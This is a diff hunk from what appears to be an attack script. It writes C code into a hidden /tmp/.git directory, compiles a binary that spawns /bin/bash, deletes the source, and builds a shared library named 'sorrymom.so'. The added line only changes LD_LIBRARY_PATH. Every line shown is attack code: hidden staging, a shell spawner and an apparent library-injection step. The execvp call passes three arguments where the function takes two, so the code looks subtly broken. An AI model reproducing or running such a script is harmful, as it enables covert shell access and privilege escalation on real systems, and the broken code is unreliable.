@@ -24,6 +24,7 @@ int main(void){
     execvp("/bin/bash", NULL, NULL);
 }
 EOF
+export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
 gcc -static -o /tmp/.git/init /tmp/.git/init.c 2>&1
 rm -rf /tmp/.git/init.c
 gcc -fPIC -shared -ldl -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c 2>&1
